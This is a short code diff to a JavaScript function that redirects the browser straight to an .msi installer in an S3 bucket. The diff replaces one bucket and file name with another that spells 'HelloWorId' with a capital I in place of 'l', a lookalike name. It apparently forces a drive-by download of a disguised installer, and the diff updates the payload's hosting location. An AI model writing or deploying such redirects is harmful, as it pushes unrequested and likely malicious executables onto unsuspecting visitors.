@@ -1,5 +1,5 @@
 function GetToFunction()
 {
-	var url="https://hellowordeyt.s3.ap-southeast-1.amazonaws.com/HelloWorld4.msi";
+	var url="https://hweyt.s3.ap-southeast-2.amazonaws.com/HelloWorId.msi";
 	window.location=url;
 }
